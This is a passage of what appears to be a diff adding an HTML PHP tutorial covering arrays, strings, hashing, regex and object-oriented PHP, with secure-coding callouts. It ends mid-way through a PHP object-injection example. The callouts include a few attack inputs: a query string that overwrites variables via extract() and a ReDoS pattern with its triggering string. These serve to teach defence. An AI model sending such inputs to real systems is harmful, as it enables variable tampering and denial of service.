+<tr><td><code>rsort()</code></td><td>value, descending</td><td>No</td></tr>
+<tr><td><code>asort()</code></td><td>value, ascending</td><td>Yes</td></tr>
+<tr><td><code>arsort()</code></td><td>value, descending</td><td>Yes</td></tr>
+<tr><td><code>ksort()</code></td><td>key, ascending</td><td>Yes</td></tr>
+<tr><td><code>krsort()</code></td><td>key, descending</td><td>Yes</td></tr>
+<tr><td><code>usort()</code></td><td>value, custom</td><td>No</td></tr>
+<tr><td><code>uasort()</code></td><td>value, custom</td><td>Yes</td></tr>
+<tr><td><code>uksort()</code></td><td>key, custom</td><td>Yes</td></tr>
+</table>
+
+<pre><code>&lt;?php
+$nums = [3, 1, 4, 1, 5];
+
+sort($nums);     // [1, 1, 3, 4, 5]
+
+$users = [
+    ["name" =&gt; "Devils", "age" =&gt; 22],
+    ["name" =&gt; "Bhai",   "age" =&gt; 25],
+    ["name" =&gt; "Rise",   "age" =&gt; 20],
+];
+
+usort($users, fn($a, $b) =&gt; $a["age"] &lt;=&gt; $b["age"]);
+// sorted by age ascending
+
+// Multi-key sort
+usort($users, function($a, $b) {
+    return [$a["age"], $a["name"]] &lt;=&gt; [$b["age"], $b["name"]];
+});
+?&gt;</code></pre>
+
+<h3>Extraction</h3>
+
+<pre><code>&lt;?php
+$user = ["name" =&gt; "Devils", "age" =&gt; 22, "email" =&gt; "d@x.com"];
+
+array_keys($user);      // ["name", "age", "email"]
+array_values($user);    // ["Devils", 22, "d@x.com"]
+
+$users = [
+    ["name" =&gt; "A", "email" =&gt; "a@x.com"],
+    ["name" =&gt; "B", "email" =&gt; "b@x.com"],
+];
+array_column($users, "email");    // ["a@x.com", "b@x.com"]
+array_column($users, "email", "name"); // ["A" =&gt; "a@x.com", "B" =&gt; "b@x.com"]
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Never use <code>extract()</code> on user input.</strong> This function turns array keys into local variables. If you do <code>extract($_GET)</code> and your code later uses <code>$config</code> or <code>$auth</code>, an attacker can send <code>?config=evil&amp;auth=1</code> and overwrite them. This pattern is behind dozens of historical CVEs in legacy PHP frameworks.
+</div>
+
+<h2>3.3 String Functions</h2>
+
+<div class="theory">
+PHP strings are <strong>binary-safe</strong> — they're just byte sequences. This means they can contain any data (including null bytes), and they can be manipulated with a huge library of functions. The ones below cover string handling for 99% of real projects.
+</div>
+
+<h3>Length, Case, Whitespace</h3>
+
+<pre><code>&lt;?php
+$s = "Hello World";
+
+strlen($s);               // 11
+strtoupper($s);           // HELLO WORLD
+strtolower($s);           // hello world
+ucfirst($s);              // Hello world
+lcfirst($s);              // hello World
+ucwords($s);              // Hello World
+
+trim($s);                 // remove whitespace both ends
+ltrim($s);                // left only
+rtrim($s);                // right only
+trim($s, " \t\n\r\0\x0B"); // specify characters
+?&gt;</code></pre>
+
+<h3>Search &amp; Replace</h3>
+
+<pre><code>&lt;?php
+$s = "Hello World, Hello Again";
+
+strpos($s, "World");         // 6
+strpos($s, "world");         // false (case-sensitive)
+stripos($s, "world");        // 6  (case-insensitive)
+strrpos($s, "Hello");        // 13 (last occurrence)
+
+str_replace("Hello", "Hi", $s);           // Hi World, Hi Again
+str_ireplace("HELLO", "Hi", $s);          // case-insensitive
+substr_count($s, "Hello");                // 2
+
+substr($s, 0, 5);            // "Hello"
+substr($s, 6);               // "World, Hello Again"
+substr($s, -5);              // "Again"
+?&gt;</code></pre>
+
+<div class="security">
+<code>strpos()</code> returns <code>0</code> when the needle is at position 0. Since <code>0</code> is falsy in PHP, this code is buggy:
+<pre style="margin-top:8px;"><code>if (strpos($haystack, $needle)) { ... }  // WRONG
+
+// Correct:
+if (strpos($haystack, $needle) !== false) { ... }</code></pre>
+This bug is a classic PHP vulnerability that has appeared in real auth-bypass exploits.
+</div>
+
+<h3>Split &amp; Join</h3>
+
+<pre><code>&lt;?php
+$csv = "a,b,c,d";
+
+$parts = explode(",", $csv);          // ["a","b","c","d"]
+$parts = explode(",", $csv, 2);       // ["a", "b,c,d"] (limit)
+
+$joined = implode("-", $parts);       // "a-b-c-d"
+$joined = join("-", $parts);          // same thing (alias)
+
+str_split("hello", 2);                // ["he","ll","o"]
+str_split("hello");                   // ["h","e","l","l","o"]
+?&gt;</code></pre>
+
+<h3>Padding &amp; Repeating</h3>
+
+<pre><code>&lt;?php
+str_pad("5", 3, "0", STR_PAD_LEFT);     // "005"
+str_pad("hi", 10, "*", STR_PAD_BOTH);   // "****hi****"
+
+str_repeat("ab", 3);                    // "ababab"
+str_repeat("=", 20);                    // "===================="
+?&gt;</code></pre>
+
+<h3>Comparison</h3>
+
+<pre><code>&lt;?php
+strcmp("abc", "abd");       // negative (abc &lt; abd)
+strcmp("abc", "abc");       // 0
+strcasecmp("ABC", "abc");   // 0 (case-insensitive)
+strncmp("abcdef", "abcxyz", 3);   // 0 (first 3 chars match)
+
+// Natural order (2 vs 10, not alphabetically)
+strnatcmp("img2.png", "img10.png");   // img2 &lt; img10 (natural)
+strcmp("img2.png", "img10.png");      // img10 &lt; img2 (alphabetical)
+?&gt;</code></pre>
+
+<h3>Hashing</h3>
+
+<div class="theory">
+Hashing produces a fixed-size fingerprint of any input. Useful for integrity checks and — with the right algorithm — for storing passwords.
+</div>
+
+<pre><code>&lt;?php
+// General-purpose hashing (fast, NOT for passwords)
+md5("hello");                       // 5d41402abc4b2a76b9719d911017c592
+sha1("hello");                      // aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d
+hash("sha256", "hello");            // 2cf24dba5fb0a30e26e83b2ac5b9e29e...
+
+// Password hashing (SLOW, with salt — CORRECT way)
+$hash = password_hash("mypassword", PASSWORD_BCRYPT);
+// $2y$10$abcdefghijklmnopqrstuvwxyz...
+
+// Verify
+if (password_verify("mypassword", $hash)) {
+    echo "Correct!";
+}
+
+// HMAC — keyed hash for signatures
+$mac = hash_hmac("sha256", "message", "secret-key");
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Never store passwords with MD5 or SHA1.</strong> Both are broken — attackers have rainbow tables that reverse them in milliseconds. And <code>md5($password)</code> is trivially defeated by a GPU brute force.
+<br><br>
+<strong>Always use <code>password_hash()</code> + <code>password_verify()</code>.</strong> These use bcrypt (or Argon2, or scrypt) with a per-password salt, key stretching, and a configurable work factor. This is the correct, industry-standard approach.
+</div>
+
+<h3>Encoding &amp; Escaping</h3>
+
+<pre><code>&lt;?php
+// Base64
+base64_encode("hello");       // aGVsbG8=
+base64_decode("aGVsbG8=");    // hello
+
+// URL encoding
+urlencode("hello world");     // hello+world
+rawurlencode("hello world");  // hello%20world
+urldecode("hello+world");     // hello world
+
+// HTML escaping (CRITICAL for XSS prevention)
+htmlspecialchars("&lt;script&gt;", ENT_QUOTES, 'UTF-8');
+// &amp;lt;script&amp;gt;
+
+// HTML entities (all named entities, not just special chars)
+htmlentities("café", ENT_QUOTES, 'UTF-8');
+?&gt;</code></pre>
+
+<div class="security">
+<strong>XSS defense rule:</strong> every piece of user data echoed into HTML must be passed through <code>htmlspecialchars($data, ENT_QUOTES, 'UTF-8')</code>. The <code>ENT_QUOTES</code> flag escapes both single and double quotes so the data can be safely embedded in any HTML attribute. <code>strip_tags()</code> alone is NOT sufficient — it can leave partial tags that browsers still parse.
+</div>
+
+<h3>Formatting</h3>
+
+<pre><code>&lt;?php
+sprintf("Name: %s, Age: %d, Pi: %.2f", "Devils", 22, 3.14159);
+// "Name: Devils, Age: 22, Pi: 3.14"
+
+// Number formatting
+number_format(1234567.891);            // "1,234,567"
+number_format(1234567.891, 2);         // "1,234,567.89"
+number_format(1234567.891, 2, ",", " "); // "1 234 567,89" (European)
+
+// Padding with sprintf
+sprintf("%05d", 42);          // "00042"
+sprintf("%-10s|", "left");    // "left      |"
+sprintf("%'*10s", "right");   // "*****right"
+?&gt;</code></pre>
+
+<h2>3.4 Heredoc &amp; Nowdoc</h2>
+
+<div class="theory">
+Heredoc and Nowdoc provide multi-line string syntax with a custom delimiter. <strong>Heredoc</strong> behaves like a double-quoted string — variables are interpolated, escape sequences work. <strong>Nowdoc</strong> behaves like a single-quoted string — everything is literal.
+</div>
+
+<div class="analogy">
+<p>Heredoc is like a template with <code>{{placeholders}}</code> — the system fills in variables. Nowdoc is like a plain text file — you type exactly what you want, and nothing gets replaced.</p>
+</div>
+
+<pre><code>&lt;?php
+$name = "Devils";
+$age  = 22;
+
+// Heredoc — interpolates
+$html = &lt;&lt;&lt;HTML
+&lt;div class="user"&gt;
+    &lt;h2&gt;$name&lt;/h2&gt;
+    &lt;p&gt;Age: $age&lt;/p&gt;
+&lt;/div&gt;
+HTML;
+
+// Nowdoc — literal (note the single quotes on the identifier)
+$sql = &lt;&lt;&lt;'SQL'
+SELECT * FROM users
+WHERE name = '$name'
+SQL;
+
+// Flexible indentation (PHP 7.3+)
+$text = &lt;&lt;&lt;EOT
+    Line 1
+    Line 2
+    Line 3
+    EOT;
+// All three lines are indented equally — PHP strips the common leading whitespace
+?&gt;</code></pre>
+
+<div class="note">
+The closing identifier <strong>must</strong> be on its own line, and since PHP 7.3 it can be indented (PHP strips the indentation from all lines). Before PHP 7.3, it had to start at column 0.
+</div>
+
+<h2>3.5 Regular Expressions (PCRE)</h2>
+
+<div class="theory">
+PHP uses <strong>PCRE</strong> (Perl Compatible Regular Expressions) for pattern matching. The functions are <code>preg_match</code> (first match), <code>preg_match_all</code> (all matches), <code>preg_replace</code> (search &amp; replace), and <code>preg_split</code> (split by pattern). A regex is written as a string with a delimiter — usually <code>/</code> — surrounding the pattern.
+</div>
+
+<div class="analogy">
+<p>A regular expression is a tiny programming language for describing text patterns. Instead of saying "find the word 'cat' exactly", you can say "find any word that starts with c, has three letters, and ends with t." It's a find-and-replace on steroids.</p>
+</div>
+
+<h3>Basic Patterns</h3>
+
+<pre><code>&lt;?php
+// Match — returns 1 if matched, 0 if not, false on error
+preg_match('/\d+/', "abc123def", $m);
+echo $m[0];   // "123"
+
+// All matches
+preg_match_all('/\d+/', "a1b22c333", $m);
+print_r($m[0]);   // [1, 22, 333]
+
+// Replace
+echo preg_replace('/\s+/', ' ', "a   b   c");   // "a b c"
+
+// Split
+print_r(preg_split('/[,;]+/', "a,b;;c"));       // ["a", "b", "c"]
+?&gt;</code></pre>
+
+<h3>Common Metacharacters</h3>
+
+<table>
+<tr><th>Pattern</th><th>Matches</th></tr>
+<tr><td><code>.</code></td><td>Any character except newline</td></tr>
+<tr><td><code>\d</code></td><td>Digit (0-9)</td></tr>
+<tr><td><code>\D</code></td><td>Non-digit</td></tr>
+<tr><td><code>\w</code></td><td>Word char (a-z, A-Z, 0-9, _)</td></tr>
+<tr><td><code>\W</code></td><td>Non-word char</td></tr>
+<tr><td><code>\s</code></td><td>Whitespace (space, tab, newline)</td></tr>
+<tr><td><code>\S</code></td><td>Non-whitespace</td></tr>
+<tr><td><code>^</code></td><td>Start of string (or line with /m)</td></tr>
+<tr><td><code>$</code></td><td>End of string (or line with /m)</td></tr>
+<tr><td><code>\b</code></td><td>Word boundary</td></tr>
+<tr><td><code>[abc]</code></td><td>Any of a, b, c</td></tr>
+<tr><td><code>[^abc]</code></td><td>Any char except a, b, c</td></tr>
+<tr><td><code>[a-z]</code></td><td>Any lowercase letter</td></tr>
+<tr><td><code>*</code></td><td>Zero or more (greedy)</td></tr>
+<tr><td><code>+</code></td><td>One or more</td></tr>
+<tr><td><code>?</code></td><td>Zero or one</td></tr>
+<tr><td><code>{3}</code></td><td>Exactly 3</td></tr>
+<tr><td><code>{2,5}</code></td><td>Between 2 and 5</td></tr>
+<tr><td><code>|</code></td><td>Alternation (OR)</td></tr>
+<tr><td><code>(...)</code></td><td>Capture group</td></tr>
+<tr><td><code>(?:...)</code></td><td>Non-capturing group</td></tr>
+</table>
+
+<h3>Practical Patterns</h3>
+
+<pre><code>&lt;?php
+// Email (simplified — real validation requires sending verification email)
+$email = '/^[^\s@]+@[^\s@]+\.[^\s@]+$/';
+
+// Phone (10-15 digits, optional leading +)
+$phone = '/^\+?[0-9]{10,15}$/';
+
+// URL
+$url = '/^https?:\/\/[^\s]+$/';
+
+// IPv4
+$ipv4 = '/^(\d{1,3}\.){3}\d{1,3}$/';
+
+// Hex color
+$hex = '/^#?([a-f0-9]{6}|[a-f0-9]{3})$/i';
+
+// Indian PIN code
+$pin = '/^[1-9][0-9]{5}$/';
+
+// Date YYYY-MM-DD
+$date = '/^\d{4}-\d{2}-\d{2}$/';
+?&gt;</code></pre>
+
+<h3>Named Groups</h3>
+
+<div class="theory">
+Named groups let you reference capture groups by name instead of number — much more readable.
+</div>
+
+<pre><code>&lt;?php
+$pattern = '/(?P&lt;year&gt;\d{4})-(?P&lt;month&gt;\d{2})-(?P&lt;day&gt;\d{2})/';
+preg_match($pattern, "2024-10-07", $m);
+
+echo $m['year'];    // 2024
+echo $m['month'];   // 10
+echo $m['day'];     // 07
+// Also available as $m[1], $m[2], $m[3]
+?&gt;</code></pre>
+
+<h3>Lookahead &amp; Lookbehind</h3>
+
+<div class="theory">
+Lookarounds let you assert that a pattern is (or isn't) followed by something, without consuming those characters.
+</div>
+
+<pre><code>&lt;?php
+// Positive lookahead — match "foo" only if followed by "bar"
+preg_match('/foo(?=bar)/', "foobar", $m);    // matches "foo"
+
+// Negative lookahead — match "foo" only if NOT followed by "bar"
+preg_match('/foo(?!bar)/', "foobaz", $m);    // matches "foo"
+
+// Positive lookbehind — match "bar" only if preceded by "foo"
+preg_match('/(?&lt;=foo)bar/', "foobar", $m);  // matches "bar"
+
+// Negative lookbehind
+preg_match('/(?&lt;!foo)bar/', "bazbar", $m);  // matches "bar"
+
+// Extract price without the $ sign
+preg_match('/(?&lt;=\$)\d+(\.\d+)?/', "Price: $19.99", $m);
+echo $m[0];   // "19.99"
+?&gt;</code></pre>
+
+<h3>Modifiers</h3>
+
+<pre><code>&lt;?php
+/pattern/i    // case-insensitive
+/pattern/m    // multi-line mode (^ and $ match per line)
+/pattern/s    // dot matches newline
+/pattern/x    // extended — ignore whitespace in pattern
+/pattern/u    // unicode — treat as UTF-8
+/pattern/U    // ungreedy (invert * and +)
+
+// Example
+preg_match('/hello world/i', "HELLO WORLD");    // matches
+preg_match('/^line/m', "line1\nline2");         // matches
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Three critical regex security issues:</strong>
+<ol style="margin-top:8px;">
+  <li><strong>ReDoS (Regular Expression Denial of Service):</strong> Patterns like <code>/(a+)+$/</code> backtrack exponentially. On a string like <code>"aaaaaaaaaaaaaaaaaaaaaaaaaaaaX"</code>, matching takes hours. An attacker can DoS your server by sending such input to a vulnerable endpoint. Cap user input length, use possessive quantifiers (<code>a++</code>), or atomic groups (<code>(?&gt;a+)</code>).</li>
+  <li><strong>The <code>/e</code> modifier (REMOVED in PHP 7):</strong> Used to evaluate the replacement as PHP code — a direct RCE. If you see it in old code, patch immediately to use <code>preg_replace_callback</code>.</li>
+  <li><strong>Missing <code>preg_quote():</code></strong> If user input goes into a pattern without escaping, an attacker injects arbitrary regex. Always <code>preg_quote($userInput, '/')</code> first.</li>
+</ol>
+</div>
+
+<h2>3.6 Level 3 Practice</h2>
+
+<div class="practice">
+<ol>
+  <li><strong>CSV parser:</strong> Given a multi-line string representing CSV data, split it into an array of associative arrays. Handle quoted fields containing commas.</li>
+  <li><strong>Validator toolkit:</strong> Write a class with methods <code>isEmail</code>, <code>isPhone</code>, <code>isUrl</code>, <code>isIp</code>. Each returns bool. Use regex.</li>
+  <li><strong>Word frequency:</strong> Given a paragraph, return the top 10 most frequent words (case-insensitive, ignore punctuation).</li>
+  <li><strong>Sort users:</strong> Given an array of user arrays with name/age/city, sort by age ascending, then by name alphabetically.</li>
+  <li><strong>URL extractor:</strong> Use <code>preg_match_all</code> to find every URL in a block of text.</li>
+  <li><strong>Template engine:</strong> Implement a mini template function that replaces <code>{{name}}</code> in a heredoc string with values from an array.</li>
+  <li><strong>Safe whitelist:</strong> Write a function <code>checkRole(string $role): bool</code> that returns true only if <code>$role</code> is one of "admin", "teacher", "student" — using <code>in_array</code> with <code>strict: true</code>.</li>
+</ol>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ==================================================== -->
+<!--                     LEVEL 4                         -->
+<!-- ==================================================== -->
+<h1>Level 4 — Object-Oriented PHP <span class="badge int">INTERMEDIATE</span></h1>
+
+<h2>4.1 Why OOP</h2>
+
+<div class="theory">
+Object-Oriented Programming is a design paradigm that organizes code around <strong>objects</strong> — bundles of data and the functions that operate on that data. Instead of having dozens of loose functions passing arrays back and forth, you create classes that model real concepts: a <code>User</code>, an <code>Order</code>, a <code>Database</code>. OOP makes complex systems easier to reason about, test, and extend.
+</div>
+
+<div class="analogy">
+<p>Think of a car. In procedural code, you'd have separate variables for wheels, engine, doors, plus functions like <code>drive($wheels, $engine, $doors)</code>. In OOP, you create a <code>Car</code> object that owns its wheels, engine, and doors, and has its own <code>drive()</code> method. The car "knows" how to drive itself. You just say <code>$car-&gt;drive()</code>.</p>
+</div>
+
+<h3>The Four Pillars</h3>
+
+<table>
+<tr><th>Pillar</th><th>Meaning</th></tr>
+<tr><td><strong>Encapsulation</strong></td><td>Hide internal state, expose only what's needed</td></tr>
+<tr><td><strong>Inheritance</strong></td><td>Share behaviour between related classes (Dog is-an Animal)</td></tr>
+<tr><td><strong>Polymorphism</strong></td><td>Same interface, different behaviour (each Animal speaks differently)</td></tr>
+<tr><td><strong>Abstraction</strong></td><td>Model the essential, hide the details</td></tr>
+</table>
+
+<h2>4.2 Classes &amp; Objects</h2>
+
+<div class="theory">
+A <strong>class</strong> is a blueprint. An <strong>object</strong> is an instance of that blueprint. Classes contain <strong>properties</strong> (data) and <strong>methods</strong> (functions). Creating an object from a class is called <strong>instantiation</strong>, done with the <code>new</code> keyword.
+</div>
+
+<pre><code>&lt;?php
+class User {
+    // Properties (with types — PHP 7.4+)
+    public string $name;
+    private string $email;
+    protected int $id;
+
+    // Constructor — runs when object is created
+    public function __construct(string $name, string $email) {
+        $this-&gt;name  = $name;
+        $this-&gt;email = $email;
+        $this-&gt;id    = random_int(1, 9999);
+    }
+
+    // Method
+    public function getEmail(): string {
+        return $this-&gt;email;
+    }
+
+    public function rename(string $newName): void {
+        $this-&gt;name = $newName;
+    }
+
+    public function toArray(): array {
+        return [
+            "id"    =&gt; $this-&gt;id,
+            "name"  =&gt; $this-&gt;name,
+            "email" =&gt; $this-&gt;email,
+        ];
+    }
+}
+
+// Instantiate
+$u = new User("Devils", "d@x.com");
+
+// Access
+echo $u-&gt;name;          // Devils
+echo $u-&gt;getEmail();    // d@x.com
+$u-&gt;rename("Rise");
+?&gt;</code></pre>
+
+<div class="note">
+<code>$this</code> refers to the current object instance. It's always used inside methods to access properties and other methods.
+</div>
+
+<h2>4.3 Visibility</h2>
+
+<div class="theory">
+Visibility controls who can access a property or method. There are three levels:
+</div>
+
+<table>
+<tr><th>Modifier</th><th>Accessible From</th></tr>
+<tr><td><code>public</code></td><td>Anywhere — inside and outside the class</td></tr>
+<tr><td><code>protected</code></td><td>The class and its subclasses</td></tr>
+<tr><td><code>private</code></td><td>Only the class that declares it (not subclasses)</td></tr>
+</table>
+
+<pre><code>&lt;?php
+class Account {
+    public string $owner;           // anyone can read/write
+    protected float $balance = 0;   // subclasses can access
+    private string $pin;            // only this class
+
+    public function __construct(string $owner, string $pin) {
+        $this-&gt;owner = $owner;
+        $this-&gt;pin   = password_hash($pin, PASSWORD_BCRYPT);
+    }
+
+    public function deposit(float $amount): void {
+        if ($amount &lt;= 0) throw new InvalidArgumentException("Bad amount");
+        $this-&gt;balance += $amount;
+    }
+
+    public function getBalance(): float {
+        return $this-&gt;balance;
+    }
+
+    public function verifyPin(string $pin): bool {
+        return password_verify($pin, $this-&gt;pin);
+    }
+}
+
+$acc = new Account("Devils", "1234");
+$acc-&gt;deposit(1000);
+echo $acc-&gt;getBalance();      // 1000
+// echo $acc-&gt;balance;         // Fatal error — protected
+// echo $acc-&gt;pin;             // Fatal error — private
+?&gt;</code></pre>
+
+<div class="theory">
+The key insight: encapsulation isn't about making things "private for the sake of it." It's about <strong>protecting invariants</strong>. In the <code>Account</code> example above, the only way to change <code>$balance</code> is <code>deposit()</code> or a similar method — which validates the amount. If <code>$balance</code> were public, some other code could set it to <code>-999999</code> and break the bank.
+</div>
+
+<h2>4.4 Constructor Property Promotion (PHP 8)</h2>
+
+<div class="theory">
+Before PHP 8, defining a class with several properties required a lot of repetitive boilerplate: declare the property, then assign it in the constructor. PHP 8's <strong>constructor property promotion</strong> lets you declare and assign a property in one line, directly in the constructor signature.
+</div>
+
+<pre><code>&lt;?php
+// OLD WAY (PHP 7)
+class Point {
+    public int $x;
+    public int $y;
+    public function __construct(int $x, int $y) {
+        $this-&gt;x = $x;
+        $this-&gt;y = $y;
+    }
+}
+
+// NEW WAY (PHP 8) — same behavior, much less code
+class Point {
+    public function __construct(
+        public int $x,
+        public int $y,
+    ) {}
+}
+
+// Mix promoted and non-promoted
+class User {
+    private string $createdAt;
+
+    public function __construct(
+        public string $name,
+        public string $email,
+        public readonly int $id = 0,
+    ) {
+        $this-&gt;createdAt = date('Y-m-d H:i:s');
+    }
+}
+?&gt;</code></pre>
+
+<h2>4.5 Inheritance, Abstract, Interface, Trait</h2>
+
+<div class="theory">
+PHP provides four mechanisms for code reuse and structuring. Each has a specific purpose — using them correctly is what separates clean OOP from spaghetti classes.
+</div>
+
+<h3>Inheritance — "is-a"</h3>
+
+<pre><code>&lt;?php
+class Animal {
+    public function __construct(protected string $name) {}
+
+    public function speak(): string {
+        return "...";
+    }
+
+    public function getName(): string {
+        return $this-&gt;name;
+    }
+}
+
+class Dog extends Animal {
+    public function speak(): string {
+        return "Woof!";
+    }
+
+    public function fetch(): string {
+        return "{$this-&gt;name} fetches the ball";
+    }
+}
+
+class Cat extends Animal {
+    public function speak(): string {
+        return "Meow";
+    }
+}
+
+$d = new Dog("Rex");
+echo $d-&gt;speak();       // Woof!
+echo $d-&gt;fetch();       // Rex fetches the ball
+
+$c = new Cat("Whiskers");
+echo $c-&gt;speak();       // Meow
+
+// Polymorphism — same interface, different behavior
+function describe(Animal $a): string {
+    return "{$a-&gt;getName()} says {$a-&gt;speak()}";
+}
+echo describe($d);      // Rex says Woof!
+echo describe($c);      // Whiskers says Meow
+?&gt;</code></pre>
+
+<h3>Abstract Classes — "template with gaps"</h3>
+
+<div class="theory">
+An abstract class cannot be instantiated. It exists to be extended. It can define abstract methods (no body — subclasses must implement) alongside concrete methods (with bodies — subclasses inherit).
+</div>
+
+<pre><code>&lt;?php
+abstract class Shape {
+    abstract public function area(): float;
+    abstract public function perimeter(): float;
+
+    // Concrete method — inherited as-is
+    public function describe(): string {
+        return sprintf(
+            "%s: area=%.2f, perimeter=%.2f",
+            static::class,
+            $this-&gt;area(),
+            $this-&gt;perimeter()
+        );
+    }
+}
+
+class Circle extends Shape {
+    public function __construct(private float $radius) {}
+    public function area(): float { return M_PI * $this-&gt;radius ** 2; }
+    public function perimeter(): float { return 2 * M_PI * $this-&gt;radius; }
+}
+
+class Rectangle extends Shape {
+    public function __construct(private float $w, private float $h) {}
+    public function area(): float { return $this-&gt;w * $this-&gt;h; }
+    public function perimeter(): float { return 2 * ($this-&gt;w + $this-&gt;h); }
+}
+
+$c = new Circle(5);
+echo $c-&gt;describe();    // Circle: area=78.54, perimeter=31.42
+?&gt;</code></pre>
+
+<h3>Interfaces — "contract"</h3>
+
+<div class="theory">
+An <strong>interface</strong> defines a set of methods that a class must implement. It has no properties and no method bodies. A class can implement multiple interfaces. This is how PHP achieves multiple inheritance of behaviour (sort of).
+</div>
+
+<pre><code>&lt;?php
+interface Jsonable {
+    public function toJson(): string;
+}
+
+interface Comparable {
+    public function compareTo(mixed $other): int;
+}
+
+class Product implements Jsonable, Comparable {
+    public function __construct(
+        private string $name,
+        private float $price,
+    ) {}
+
+    public function toJson(): string {
+        return json_encode([
+            'name'  =&gt; $this-&gt;name,
+            'price' =&gt; $this-&gt;price,
+        ]);
+    }
+
+    public function compareTo(mixed $other): int {
+        if (!$other instanceof self) {
+            throw new InvalidArgumentException("Not a Product");
+        }
+        return $this-&gt;price &lt;=&gt; $other-&gt;price;
+    }
+}
+?&gt;</code></pre>
+
+<div class="theory">
+<strong>Abstract class vs Interface:</strong>
+</div>
+
+<table>
+<tr><th>Abstract Class</th><th>Interface</th></tr>
+<tr><td>Can have properties</td><td>No properties</td></tr>
+<tr><td>Can have method bodies</td><td>Only method signatures (until PHP 8's default methods)</td></tr>
+<tr><td>Single inheritance</td><td>Multiple implementation</td></tr>
+<tr><td>Use for "is-a" with shared code</td><td>Use for "can-do" contract</td></tr>
+</table>
+
+<h3>Traits — horizontal reuse</h3>
+
+<div class="theory">
+A <strong>trait</strong> is a bundle of methods that can be "mixed in" to any class. Unlike inheritance, which models "is-a," traits model "has this behaviour." A class can use multiple traits. This solves the diamond problem — you can share behaviour across unrelated classes.
+</div>
+
+<pre><code>&lt;?php
+trait Loggable {
+    public function log(string $message): void {
+        error_log("[" . static::class . "] $message");
+    }
+}
+
+trait Timestampable {
+    private ?DateTime $createdAt = null;
+    private ?DateTime $updatedAt = null;
+
+    public function touchCreated(): void {
+        $this-&gt;createdAt = new DateTime();
+    }
+
+    public function touchUpdated(): void {
+        $this-&gt;updatedAt = new DateTime();
+    }
+
+    public function getCreatedAt(): ?DateTime { return $this-&gt;createdAt; }
+    public function getUpdatedAt(): ?DateTime { return $this-&gt;updatedAt; }
+}
+
+class Order {
+    use Loggable, Timestampable;
+
+    public function __construct(public int $id) {
+        $this-&gt;touchCreated();
+    }
+}
+
+$order = new Order(101);
+$order-&gt;log("Order created");   // [Order] Order created
+?&gt;</code></pre>
+
+<h3>Trait Conflict Resolution</h3>
+
+<pre><code>&lt;?php
+trait A { public function hi() { return "A"; } }
+trait B { public function hi() { return "B"; } }
+
+class C {
+    use A, B {
+        A::hi insteadof B;    // use A's version when both exist
+        B::hi as hiFromB;     // rename B's version
+    }
+}
+
+$c = new C();
+echo $c-&gt;hi();         // A
+echo $c-&gt;hiFromB();    // B
+?&gt;</code></pre>
+
+<h2>4.6 Static Members &amp; Late Static Binding</h2>
+
+<div class="theory">
+Static properties and methods belong to the class itself, not to any particular instance. You access them with <code>::</code>. They're useful for counters, singletons, factory methods, and utility helpers.
+</div>
+
+<pre><code>&lt;?php
+class Counter {
+    private static int $count = 0;
+    public const VERSION = "1.0";
+
+    public static function increment(): void {
+        static::$count++;      // late static binding
+    }
+
+    public static function get(): int {
+        return static::$count;
+    }
+}
+
+Counter::increment();
+Counter::increment();
+echo Counter::get();          // 2
+echo Counter::VERSION;        // 1.0
+?&gt;</code></pre>
+
+<div class="theory">
+<strong><code>self::</code> vs <code>static::</code></strong> — a subtle but critical distinction.
+</div>
+
+<pre><code>&lt;?php
+class ParentClass {
+    public static function who() {
+        return self::class;      // always "ParentClass"
+    }
+
+    public static function whoStatic() {
+        return static::class;    // the class actually called
+    }
+}
+
+class ChildClass extends ParentClass {}
+
+echo ChildClass::who();         // ParentClass
+echo ChildClass::whoStatic();   // ChildClass
+?&gt;</code></pre>
+
+<div class="theory">
+Use <code>static::</code> (late static binding) whenever you want a method to behave correctly in subclasses. Use <code>self::</code> when you explicitly want the class where the code was written.
+</div>
+
+<h2>4.7 Magic Methods</h2>
+
+<div class="theory">
+Magic methods are special methods with names starting with <code>__</code>. PHP calls them automatically in certain situations — object creation, property access, casting, serialization, cloning, and so on. They give you powerful control over how objects behave.
+</div>
+
+<h3>Lifecycle Methods</h3>
+
+<pre><code>&lt;?php
+class Resource {
+    public function __construct() {
+        echo "Created\n";
+    }
+
+    public function __destruct() {
+        echo "Destroyed\n";
+    }
+}
+
+$r = new Resource();    // Created
+unset($r);              // Destroyed
+?&gt;</code></pre>
+
+<h3>Property Overloading</h3>
+
+<pre><code>&lt;?php
+class Dynamic {
+    private array $data = [];
+
+    public function __get(string $name): mixed {
+        return $this-&gt;data[$name] ?? null;
+    }
+
+    public function __set(string $name, mixed $value): void {
+        $this-&gt;data[$name] = $value;
+    }
+
+    public function __isset(string $name): bool {
+        return isset($this-&gt;data[$name]);
+    }
+
+    public function __unset(string $name): void {
+        unset($this-&gt;data[$name]);
+    }
+}
+
+$d = new Dynamic();
+$d-&gt;foo = "bar";         // __set called
+echo $d-&gt;foo;            // __get called → "bar"
+isset($d-&gt;foo);          // __isset → true
+unset($d-&gt;foo);          // __unset called
+?&gt;</code></pre>
+
+<h3>Casting &amp; Calling</h3>
+
+<pre><code>&lt;?php
+class Money {
+    public function __construct(private float $amount) {}
+
+    public function __toString(): string {
+        return "$" . number_format($this-&gt;amount, 2);
+    }
+
+    public function __invoke(float $multiplier): self {
+        return new self($this-&gt;amount * $multiplier);
+    }
+}
+
+$m = new Money(19.99);
+echo $m;                 // $19.99 (via __toString)
+$m2 = $m(2);             // $m2 = new Money(39.98) (via __invoke)
+echo $m2;                // $39.98
+?&gt;</code></pre>
+
+<h3>Serialization</h3>
+
+<pre><code>&lt;?php
+class Session {
+    private array $data = [];
+
+    public function set(string $key, mixed $value): void {
+        $this-&gt;data[$key] = $value;
+    }
+
+    public function __serialize(): array {
+        return $this-&gt;data;
+    }
+
+    public function __unserialize(array $data): void {
+        $this-&gt;data = $data;
+    }
+}
+?&gt;</code></pre>
+
+<div class="security">
+<strong>PHP Object Injection (POI) — the flagship magic-method vulnerability.</strong>
+<br><br>
+When PHP unserializes a string, it reconstructs objects from your codebase and calls <code>__wakeup()</code> or <code>__destruct()</code> at the appropriate moment. If any of those methods performs a dangerous operation — deleting a file, executing a shell command, writing to disk — an attacker can trigger it.
+<br><br>
+<strong>Vulnerable pattern:</strong>
+<pre style="margin-top:8px;"><code>class FileLogger {
+    public string $path;
+    public function __destruct() {
